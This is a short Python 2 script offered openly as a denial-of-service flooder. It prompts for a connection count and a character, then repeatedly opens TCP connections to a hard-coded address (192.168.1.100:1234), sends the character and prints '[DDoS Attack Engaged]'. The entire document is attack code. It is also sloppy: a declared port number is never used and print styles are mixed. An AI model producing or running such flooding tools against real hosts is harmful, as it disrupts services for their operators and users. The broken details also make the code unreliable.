import time, socket, os, sys, string
 
print ("DDoS mode loaded")
port=4321#port number
conn=input( "How many connections?: " )
message= raw_input("type a char ('m' to DDOS flood): ")
def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#connect to socket
    try:#try to connect
        ddos.connect(('192.168.1.100', 1234))#connect to IP,port
        ddos.send(message)#send the message
        ddos.send(message)#send the message
    except socket.error, msg:#if error connecting
        print("|[Connection Failed]         |")
    print ( "|[DDoS Attack Engaged]       |")
    ddos.close()#close
 
for i in xrange(conn):
    dos()
